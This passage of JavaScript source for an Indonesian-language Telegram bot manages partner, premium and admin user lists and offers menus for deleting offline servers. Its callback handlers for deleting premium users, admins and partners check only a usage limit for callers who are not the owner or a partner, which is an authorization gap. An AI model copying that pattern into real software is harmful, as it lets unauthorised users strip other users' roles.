𝖳𝗈𝗍𝖺𝗅: ${partnerUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
});

// -------------------- ( Action : List Partner Pagination ) --------------------
bot.action(/^listpt_page_(\d+)$/, async (ctx) => {
    const page = parseInt(ctx.match[1]);
    const userId = ctx.from.id.toString();

    if (!isAdminOrOwner(userId)) {
        return ctx.answerCbQuery("❌ Anda tidak memiliki akses!", true);
    }

    partnerUsers = loadPartnerUsers();

    if (partnerUsers.length === 0) {
        await ctx.answerCbQuery("❌ Tidak ada data!", true);
        return;
    }

    const itemsPerPage = 8;
    const totalPages = Math.ceil(partnerUsers.length / itemsPerPage);

    if (page < 1 || page > totalPages) {
        return ctx.answerCbQuery("❌ Halaman tidak valid!", true);
    }

    const startIndex = (page - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, partnerUsers.length);
    const currentItems = partnerUsers.slice(startIndex, endIndex);

    let partnerList = "";
    let count = startIndex + 1;

    for (const partnerId of currentItems) {
        try {
            const userInfo = await getUserInfo(partnerId);
            partnerList += `${count}. ${userInfo.first_name} (@${userInfo.username}) - ID: ${partnerId}\n`;
            count++;
        } catch (error) {
            partnerList += `${count}. Unknown User - ID: ${partnerId}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (page > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listpt_page_${page - 1}` });
        }
        row.push({ text: `${page}/${totalPages}`, callback_data: "no_action" });
        if (page < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listpt_page_${page + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.editMessageCaption(
        `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝖺𝗋𝗍𝗇𝖾𝗋</b>

${partnerList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${page}/${totalPages}
𝖳𝗈𝗍𝖺𝗅: ${partnerUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        }
    );

    await ctx.answerCbQuery();
});

// -------------------- ( Command : List Premium ) --------------------
bot.command("listprem", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "listprem");
    if (!limitAllowed) return;

    premiumUsers = loadPremiumUsers();

    if (premiumUsers.length === 0) {
        return ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝗋𝖾𝗆𝗂𝗎𝗆</b>

📭 Tidak ada user premium.

─────────────────────
𝖳𝗈𝗍𝖺𝗅: 0 𝗎𝗌𝖾𝗋</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });
    }

    // Pagination
    const itemsPerPage = 6;
    const totalPages = Math.ceil(premiumUsers.length / itemsPerPage);

    const currentPage = 1;
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, premiumUsers.length);
    const currentItems = premiumUsers.slice(startIndex, endIndex);

    let premiumList = "";
    let count = startIndex + 1;

    for (const premiumUser of currentItems) {
        try {
            const userInfo = await getUserInfo(premiumUser.id);
            const status = formatPremiumTime(premiumUser.expired);

            premiumList += `${count}. ${userInfo.first_name} (@${userInfo.username})\n   🆔: ${premiumUser.id}\n   ⏳ ${status}\n`;
            count++;
        } catch (error) {
            const status = formatPremiumTime(premiumUser.expired);
            premiumList += `${count}. Unknown User\n   🆔: ${premiumUser.id}\n   ⏳ ${status}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (currentPage > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listprem_page_${currentPage - 1}` });
        }
        row.push({ text: `${currentPage}/${totalPages}`, callback_data: "no_action" });
        if (currentPage < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listprem_page_${currentPage + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.replyWithPhoto(menuimage(), {
        caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝗋𝖾𝗆𝗂𝗎𝗆</b>

${premiumList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${currentPage}/${totalPages}
𝖳𝗈𝗍𝖺𝗅: ${premiumUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
});

// -------------------- ( Action : List Premium Pagination ) --------------------
bot.action(/^listprem_page_(\d+)$/, async (ctx) => {
    const page = parseInt(ctx.match[1]);
    const userId = ctx.from.id.toString();

    if (!isAdminOrOwner(userId)) {
        return ctx.answerCbQuery("❌ Anda tidak memiliki akses!", true);
    }

    premiumUsers = loadPremiumUsers();

    if (premiumUsers.length === 0) {
        await ctx.answerCbQuery("❌ Tidak ada data!", true);
        return;
    }

    const itemsPerPage = 6;
    const totalPages = Math.ceil(premiumUsers.length / itemsPerPage);

    if (page < 1 || page > totalPages) {
        return ctx.answerCbQuery("❌ Halaman tidak valid!", true);
    }

    const startIndex = (page - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, premiumUsers.length);
    const currentItems = premiumUsers.slice(startIndex, endIndex);

    let premiumList = "";
    let count = startIndex + 1;

    for (const premiumUser of currentItems) {
        try {
            const userInfo = await getUserInfo(premiumUser.id);
            const status = formatPremiumTime(premiumUser.expired);

            premiumList += `${count}. ${userInfo.first_name} (@${userInfo.username})\n   🆔: ${premiumUser.id}\n   ⏳ ${status}\n`;
            count++;
        } catch (error) {
            const status = formatPremiumTime(premiumUser.expired);
            premiumList += `${count}. Unknown User\n   🆔: ${premiumUser.id}\n   ⏳ ${status}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (page > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listprem_page_${page - 1}` });
        }
        row.push({ text: `${page}/${totalPages}`, callback_data: "no_action" });
        if (page < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listprem_page_${page + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.editMessageCaption(
        `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖯𝗋𝖾𝗆𝗂𝗎𝗆</b>

${premiumList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${page}/${totalPages}
𝖳𝗈𝗍𝖺𝗅: ${premiumUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        }
    );

    await ctx.answerCbQuery();
});

// -------------------- ( Command : List Admin ) --------------------
bot.command("listadmin", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "listadmin");
    if (!limitAllowed) return;

    adminUsers = loadAdminUsers();

    if (adminUsers.length === 0) {
        return ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖠𝖽𝗆𝗂𝗇</b>

📭 Tidak ada admin.

─────────────────────
𝖳𝗈𝗍𝖺𝗅: 0 𝗎𝗌𝖾𝗋</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });
    }

    // Pagination
    const itemsPerPage = 8;
    const totalPages = Math.ceil(adminUsers.length / itemsPerPage);

    const currentPage = 1;
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, adminUsers.length);
    const currentItems = adminUsers.slice(startIndex, endIndex);

    let adminList = "";
    let count = startIndex + 1;

    for (const adminId of currentItems) {
        try {
            const userInfo = await getUserInfo(adminId);
            adminList += `${count}. ${userInfo.first_name} (@${userInfo.username}) - ID: ${adminId}\n`;
            count++;
        } catch (error) {
            adminList += `${count}. Unknown User - ID: ${adminId}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (currentPage > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listadmin_page_${currentPage - 1}` });
        }
        row.push({ text: `${currentPage}/${totalPages}`, callback_data: "no_action" });
        if (currentPage < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listadmin_page_${currentPage + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.replyWithPhoto(menuimage(), {
        caption: `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖠𝖽𝗆𝗂𝗇</b>

${adminList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${currentPage}/${totalPages}
𝖳𝗈𝗍𝖺𝗅: ${adminUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: keyboard }
    });
});

// -------------------- ( Action : List Admin Pagination ) --------------------
bot.action(/^listadmin_page_(\d+)$/, async (ctx) => {
    const page = parseInt(ctx.match[1]);
    const userId = ctx.from.id.toString();

    if (!isAdminOrOwner(userId)) {
        return ctx.answerCbQuery("❌ Anda tidak memiliki akses!", true);
    }

    adminUsers = loadAdminUsers();

    if (adminUsers.length === 0) {
        await ctx.answerCbQuery("❌ Tidak ada data!", true);
        return;
    }

    const itemsPerPage = 8;
    const totalPages = Math.ceil(adminUsers.length / itemsPerPage);

    if (page < 1 || page > totalPages) {
        return ctx.answerCbQuery("❌ Halaman tidak valid!", true);
    }

    const startIndex = (page - 1) * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, adminUsers.length);
    const currentItems = adminUsers.slice(startIndex, endIndex);

    let adminList = "";
    let count = startIndex + 1;

    for (const adminId of currentItems) {
        try {
            const userInfo = await getUserInfo(adminId);
            adminList += `${count}. ${userInfo.first_name} (@${userInfo.username}) - ID: ${adminId}\n`;
            count++;
        } catch (error) {
            adminList += `${count}. Unknown User - ID: ${adminId}\n`;
            count++;
        }
    }

    const keyboard = [];
    if (totalPages > 1) {
        const row = [];
        if (page > 1) {
            row.push({ text: "◀️ Sebelumnya", callback_data: `listadmin_page_${page - 1}` });
        }
        row.push({ text: `${page}/${totalPages}`, callback_data: "no_action" });
        if (page < totalPages) {
            row.push({ text: "Selanjutnya ▶️", callback_data: `listadmin_page_${page + 1}` });
        }
        keyboard.push(row);
    }

    keyboard.push([
        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
    ]);

    await ctx.editMessageCaption(
        `<blockquote>
<b>📋 𝖣𝖺𝖿𝗍𝖺𝗋 𝖠𝖽𝗆𝗂𝗇</b>

${adminList}
─────────────────────
𝖧𝖺𝗅𝖺𝗆𝖺𝗇: ${page}/${totalPages}
𝖳𝗈𝗍𝖺𝗅: ${adminUsers.length} 𝗎𝗌𝖾𝗋</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        }
    );

    await ctx.answerCbQuery();
});

// -------------------- ( Action : No Action ) --------------------
bot.action("no_action", async (ctx) => {
    await ctx.answerCbQuery();
});

// -------------------- ( Command : Add Partner ) --------------------
bot.command("addpt", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "addpt");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ");
    const targetId = await getTargetUserId(ctx, args);
    if (!targetId) {
        return ctx.reply(
            "<blockquote>❌ <b>𝖲𝖺𝗅𝖺𝗁!</b>\n\n𝖱𝖺𝗉𝗅𝗒 𝖯𝖾𝗌𝖺𝗇 𝖳𝖺𝗋𝗀𝖾𝗍 𝖺𝗍𝖺𝗎 𝖪𝖺𝗌𝗂𝗁 𝖨𝖣</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    try {
        const userInfo = await getUserInfo(targetId);

        if (isPartner(targetId)) {
            return ctx.reply(
                `<blockquote>❌ <b>𝖤𝗋𝗋𝗈𝗋!</b>\n\n` +
                `𝖴𝗌𝖾𝗋: ${userInfo.first_name}\n` +
                `𝖨𝖣: ${targetId}\n` +
                `𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾: @${userInfo.username}\n\n` +
                `⚠️ <b>𝖴𝗌𝖾𝗋 𝗌𝗎𝖽𝖺𝗁 𝗆𝖾𝗇𝗃𝖺𝖽𝗂 𝗉𝖺𝗋𝗍𝗇𝖾𝗋!</b></blockquote>`,
                { parse_mode: "HTML" }
            );
        }

        const success = addPartner(targetId);
        if (!success) {
            return ctx.reply("<blockquote>❌ 𝖦𝖺𝗀𝖺𝗅 𝗆𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝗉𝖺𝗋𝗍𝗇𝖾𝗋. 𝖢𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂.</blockquote>", { parse_mode: "HTML" });
        }

        partnerUsers = loadPartnerUsers();

        await ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>✅ <b>𝖲𝖴𝖢𝖢𝖤𝖲𝖲 𝖠𝖣𝖣𝖤𝖣 𝖯𝖠𝖱𝖳𝖭𝖤𝖱</b>
𝖴𝗌𝖾𝗋: ${userInfo.first_name} ${userInfo.last_name}
𝖨𝖣: ${targetId}
𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾: @${userInfo.username}
𝖲𝗍𝖺𝗍𝗎𝗌: 𝖯𝖺𝗋𝗍𝗇𝖾𝗋
─────────────────────
© AldzyIsHere</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });

        console.log(chalk.green(`✅ Success Add Partner ${targetId}`));

    } catch (error) {
        console.error(chalk.red(`❌ Addpt error: ${error.message}`));
        await ctx.reply("<blockquote>❌ 𝖦𝖺𝗀𝖺𝗅 𝗆𝖾𝗇𝖺𝗆𝖻𝖺𝗁𝗄𝖺𝗇 𝗉𝖺𝗋𝗍𝗇𝖾𝗋. 𝖢𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂.</blockquote>", { parse_mode: "HTML" });
    }
});

// -------------------- ( Command : Add Premium ) --------------------
bot.command("addprem", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdminOrOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "addprem");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ");
    const targetId = await getTargetUserId(ctx, args);
    if (!targetId) {
        return ctx.reply(
            "<blockquote>❌ <b>𝖲𝖺𝗅𝖺𝗁!</b>\n\n𝖱𝖺𝗉𝗅𝗒 𝖯𝖾𝗌𝖺𝗇 𝖳𝖺𝗋𝗀𝖾𝗍</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    let days = 30;

    if (ctx.message.reply_to_message) {
        if (args.length >= 2) {
            days = parseInt(args[1]) || 30;
        }
    } else {
        if (args.length >= 3) {
            days = parseInt(args[2]) || 30;
        } else if (args.length >= 2) {
            days = parseInt(args[1]) || 30;
        }
    }

    if (days <= 0 || days > 100000000000000000000000000000000000000) {
        return ctx.reply("<blockquote>❌ <b>𝖤𝗋𝗋𝗈𝗋</b>𝖣𝗎𝗋𝖺𝗌𝗂 𝖭𝗒 𝗆𝖺𝗇𝖺 𝖡𝖾𝗀𝗈 😡</blockquote>", { parse_mode: "HTML" });
    }

    try {
        const userInfo = await getUserInfo(targetId);
        addPremium(targetId, days);
        premiumUsers = loadPremiumUsers();

        await ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>✅ <b>𝖲𝖴𝖢𝖢𝖤𝖲𝖲 𝖠𝖣𝖣𝖤𝖣 𝖯𝖱𝖤𝖬𝖨𝖴𝖬</b>
𝖴𝗌𝖾𝗋: ${userInfo.first_name} ${userInfo.last_name}
𝖨𝖣: ${targetId}
𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾: @${userInfo.username}
𝖣𝗎𝗋𝖺𝗍𝗂𝗈𝗇: ${days} 𝖣𝖺𝗒
─────────────────────
© AldzyIsHere</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });

        console.log(chalk.green(`✅ Success Add Premium ${targetId}`));

    } catch (error) {
        console.error(chalk.red(`❌ Addprem error: ${error.message}`));
        await ctx.reply("<blockquote>❌ 𝖦𝖺𝗀𝖺𝗅 𝖡𝗋𝖾 𝖢𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂</blockquote>", { parse_mode: "HTML" });
    }
});

// -------------------- ( Command : Add Admin ) --------------------
bot.command("addadmin", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPartner(userId)) return sendIfNotPartner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "addadmin");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ");
    const targetId = await getTargetUserId(ctx, args);

    if (!targetId) {
        return ctx.reply(
            "<blockquote>❌ <b>𝖲𝖺𝗅𝖺𝗁!</b>\n\n𝖱𝖺𝗉𝗅𝗒 𝖯𝖾𝗌𝖺𝗇 𝖳𝖺𝗋𝗀𝖾𝗍</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    try {
        const userInfo = await getUserInfo(targetId);
        adminUsers = loadAdminUsers();

        if (adminUsers.includes(targetId)) {
            return ctx.reply(`<blockquote>❌ <b>𝖤𝗋𝗋𝗈𝗋!</b>\n<b>User:</b> ${userInfo.first_name}\n<b>𝖨𝖣:</b> ${targetId}\n⚠️<b>𝖴𝗌𝖾𝗋 𝖲𝗎𝖽𝖺𝗁 𝖬𝖾𝗇𝗃𝖺𝖽𝗂 𝖠𝖽𝗆𝗂𝗇 𝖡𝖾𝗀𝗈 😡</b></blockquote>`, { parse_mode: "HTML" });
        }

        const added = addAdmin(targetId);
        if (!added) {
            return ctx.reply(`<blockquote>❌ 𝖦𝖺𝗀𝖺𝗅 𝖠𝖽𝖽𝖺𝖽𝗆𝗂𝗇 𝖢𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂</blockquote>`, { parse_mode: "HTML" });
        }

        adminUsers = loadAdminUsers();
        if (adminUsers.includes(targetId)) {
            console.log(chalk.green(`✅ Success Addadmin ${targetId}`));
        } else {
            console.log(chalk.red(`❌ Gagal Addadmin ${targetId}`));
        }

        await ctx.replyWithPhoto(menuimage(), {
            caption: `<blockquote>✅ <b>𝖲𝖴𝖢𝖢𝖤𝖲𝖲 𝖠𝖣𝖣𝖤𝖣 𝖠𝖣𝖬𝖨𝖭</b>
𝖴𝗌𝖾𝗋: ${userInfo.first_name} ${userInfo.last_name}
𝖨𝖣: ${targetId}
Username: @${userInfo.username}
𝖠𝖽𝖽 𝖱𝗈𝗅𝖾: Admin
─────────────────────
© AldzyIsHere</blockquote>`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "─ Contact Owner", url: "https://t.me/ReyValdz" }
                    ]
                ]
            }
        });

        console.log(chalk.green(`✅ Success Addadmin: ${targetId}`));

    } catch (error) {
        console.error(chalk.red(`❌ Addadmin error: ${error.message}`));
        console.error(chalk.red(`❌ Stack trace: ${error.stack}`));
        await ctx.reply("<blockquote>❌ 𝖦𝖺𝗀𝖺𝗅 𝖠𝖽𝖽𝖺𝖽𝗆𝗂𝗇 𝖢𝗈𝖻𝖺 𝗅𝖺𝗀𝗂 𝗇𝖺𝗇𝗍𝗂</blockquote>", { parse_mode: "HTML" });
    }
});

// -------------------- ( Command : Delete Premium ) --------------------
bot.command("delprem", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "delprem");
    if (!limitAllowed) return;

    premiumUsers = loadPremiumUsers();
    if (premiumUsers.length === 0) return ctx.reply("<blockquote>❌ Tidak ada user premium.</blockquote>", { parse_mode: "HTML" });

    const caption = `<blockquote>
    <b>( ⚙️ ) 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖬𝖺𝗇𝖺𝗀𝖾𝗋</b>
    
    𝖯𝗂𝗅𝗂𝗁 𝗎𝗌𝖾𝗋 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝗒𝖺𝗇𝗀 𝗂𝗇𝗀𝗂𝗇 𝗄𝖺𝗆𝗎 𝗁𝖺𝗉𝗎𝗌.
    𝖠𝗍𝖺𝗎 𝗁𝖺𝗉𝗎𝗌 𝗌𝖾𝗆𝗎𝖺 𝗌𝖾𝗄𝖺𝗅𝗂𝗀𝗎𝗌 !!

    © AldzyIsHere</blockquote>`;

    const buttons = premiumUsers.map(u => [
        { text: `🗑️ 𝖣𝖾𝗅𝖾𝗍𝖾 : ${u.id}`, callback_data: `DELPREM_${u.id}` }
    ]);

    buttons.push([
        { text: "Contact Owner", url: "https://t.me/ReyValdz" },
        { text: "↺ Kembali", callback_data: "OwnMenu" }
    ]);

    ctx.replyWithPhoto(menuimage(), {
        caption,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons }
    });
});

// -------------------- ( Action : Delete Premium User ) --------------------
bot.action(/^DELPREM_(.+)$/, async (ctx) => {
    const id = ctx.match[1];

    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) {
        const limitAllowed = await checkUserLimit(ctx, "delprem_action");
        if (!limitAllowed) return;
    }

    delPremium(id);
    await ctx.answerCbQuery();

    await ctx.editMessageCaption(
        `<blockquote><b>✅ 𝖴𝗌𝖾𝗋 ${id} 𝖻𝖾𝗋𝗁𝖺𝗌𝗂𝗅 𝖽𝗂𝗁𝖺𝗉𝗎𝗌 𝖽𝖺𝗋𝗂 𝗉𝗋𝖾𝗆𝗂𝗎𝗆.</b>\n` +
        `© AldzyIsHere</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [[{ text: "─ Contact Owner", url: "https://t.me/ReyValdz" }]] }
        }
    );
});

// -------------------- ( Command : Delete Admin ) --------------------
bot.command("deladmin", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "deladmin");
    if (!limitAllowed) return;

    adminUsers = loadAdminUsers();
    if (adminUsers.length === 0) return ctx.reply("<blockquote>❌ Tidak ada admin.</blockquote>", { parse_mode: "HTML" });

    const caption = `<blockquote>
    <b>( ⚙️ ) 𝖠𝖽𝗆𝗂𝗇 𝖬𝖺𝗇𝖺𝗀𝖾𝗋</b>
    
    𝖯𝗂𝗅𝗂𝗁 𝖺𝖽𝗆𝗂𝗇 𝗒𝖺𝗇𝗀 𝗂𝗇𝗀𝗂𝗇 𝗄𝖺𝗆𝗎 𝗁𝖺𝗉𝗎𝗌.
    𝖠𝗍𝖺𝗎 𝗁𝖺𝗉𝗎𝗌 𝗌𝖾𝗆𝗎𝖺 𝗌𝖾𝗄𝖺𝗅𝗂𝗀𝗎𝗌 !!

    © AldzyIsHere</blockquote>`;

    const buttons = adminUsers.map(id => [
        { text: `🗑️ 𝖣𝖾𝗅𝖾𝗍𝖾 : ${id}`, callback_data: `DELADMIN_${id}` }
    ]);

    buttons.push([
        { text: "Contact Owner", url: "https://t.me/ReyValdz" },
        { text: "↺ Kembali", callback_data: "OwnMenu" }
    ]);

    ctx.replyWithPhoto(menuimage(), {
        caption,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons }
    });
});

// -------------------- ( Action : Delete Admin ) --------------------
bot.action(/^DELADMIN_(.+)$/, async (ctx) => {
    const id = ctx.match[1];

    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) {
        const limitAllowed = await checkUserLimit(ctx, "deladmin_action");
        if (!limitAllowed) return;
    }

    const removed = removeAdmin(id);

    if (!removed) {
        return ctx.answerCbQuery("❌ Gagal menghapus admin.", true);
    }

    adminUsers = loadAdminUsers();

    await ctx.answerCbQuery();

    await ctx.editMessageCaption(
        `<blockquote><b>✅ Admin ${id} berhasil dihapus.</b>\n\n` +
        `© AldzyIsHere</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [[{ text: "↺ Kembali", callback_data: "deladmin" }]] }
        }
    );
});

// -------------------- ( Command : Delete Partner ) --------------------
bot.command("delpt", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPartner(userId)) return sendIfNotPartner(ctx);
    const limitAllowed = await checkUserLimit(ctx, "delpt");
    if (!limitAllowed) return;

    partnerUsers = loadPartnerUsers();
    if (partnerUsers.length === 0) return ctx.reply("<blockquote>❌ Tidak ada user partner.</blockquote>", { parse_mode: "HTML" });

    const caption = `<blockquote>
    <b>( ⚙️ ) 𝖯𝖺𝗋𝗍𝗇𝖾𝗋 𝖬𝖺𝗇𝖺𝗀𝖾𝗋</b>
    
    𝖯𝗂𝗅𝗂𝗁 𝗎𝗌𝖾𝗋 𝗉𝖺𝗋𝗍𝗇𝖾𝗋 𝗒𝖺𝗇𝗀 𝗂𝗇𝗀𝗂𝗇 𝗄𝖺𝗆𝗎 𝗁𝖺𝗉𝗎𝗌.
    𝖠𝗍𝖺𝗎 𝗁𝖺𝗉𝗎𝗌 𝗌𝖾𝗆𝗎𝖺 𝗌𝖾𝗄𝖺𝗅𝗂𝗀𝗎𝗌 !!

    © AldzyIsHere</blockquote>`;

    const buttons = partnerUsers.map(id => [
        { text: `🗑️ 𝖣𝖾𝗅𝖾𝗍𝖾 : ${id}`, callback_data: `DELPT_${id}` }
    ]);

    buttons.push([
        { text: "Contact Owner", url: "https://t.me/ReyValdz" },
        { text: "↺ Kembali", callback_data: "OwnMenu" }
    ]);

    ctx.replyWithPhoto(menuimage(), {
        caption,
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buttons }
    });
});

// -------------------- ( Action : Delete Partner User ) --------------------
bot.action(/^DELPT_(.+)$/, async (ctx) => {
    const id = ctx.match[1];

    const userId = ctx.from.id.toString();
    if (!isPartner(userId)) {
        const limitAllowed = await checkUserLimit(ctx, "delpt_action");
        if (!limitAllowed) return;
    }

    removePartner(id);
    await ctx.answerCbQuery();

    await ctx.editMessageCaption(
        `<blockquote><b>✅ 𝖴𝗌𝖾𝗋 ${id} 𝖻𝖾𝗋𝗁𝖺𝗌𝗂𝗅 𝖽𝗂𝗁𝖺𝗉𝗎𝗌 𝖽𝖺𝗋𝗂 𝗉𝖺𝗋𝗍𝗇𝖾𝗋.</b>\n` +
        `© AldzyIsHere</blockquote>`,
        {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: [[{ text: "─ Contact Owner", url: "https://t.me/ReyValdz" }]] }
        }
    );
});

// -------------------- [ command: Delete Server ] -------------------- \\
bot.command("delsrvoff", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    const commandName = "delsrvoff";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const caption = `
<blockquote><b>🗑️ HAPUS SERVER OFFLINE</b>
│• Akan menghapus semua server offline
│• Hasil akan ditampilkan setelah selesai

© AldzyIsHere</blockquote>`;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: "🗑 Server V1", callback_data: "DELSRVOFF:V1" },
                { text: "🗑 Server V2", callback_data: "DELSRVOFF:V2" }
            ],
            [
                { text: "🗑 Server V3", callback_data: "DELSRVOFF:V3" },
                { text: "🗑 Server V4", callback_data: "DELSRVOFF:V4" }
            ],
            [
                { text: "🗑 Server V5", callback_data: "DELSRVOFF:V5" }
            ]
        ]
    };

    await ctx.reply(caption, { reply_markup: inlineKeyboard, parse_mode: 'HTML' });
});

// -------------------- [ command: Clear Server ] -------------------- \\
bot.command("clearsvroff", async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    const commandName = "clearsvroff";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const caption = `
<blockquote><b>🧹 CLEAR SERVER OFFLINE & USER</b>
│• Akan menghapus server offline
│• Akan menghapus user tanpa server
│• ⏱️ Proses memakan waktu 2-5 menit

© AldzyIsHere</blockquote>`;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: "🧹 Server V1", callback_data: "CLEARSRVOFF:V1" },
                { text: "🧹 Server V2", callback_data: "CLEARSRVOFF:V2" }
            ],
            [
                { text: "🧹 Server V3", callback_data: "CLEARSRVOFF:V3" },
                { text: "🧹 Server V4", callback_data: "CLEARSRVOFF:V4" }
            ],
            [
                { text: "🧹 Server V5", callback_data: "CLEARSRVOFF:V5" }
            ]
        ]
    };

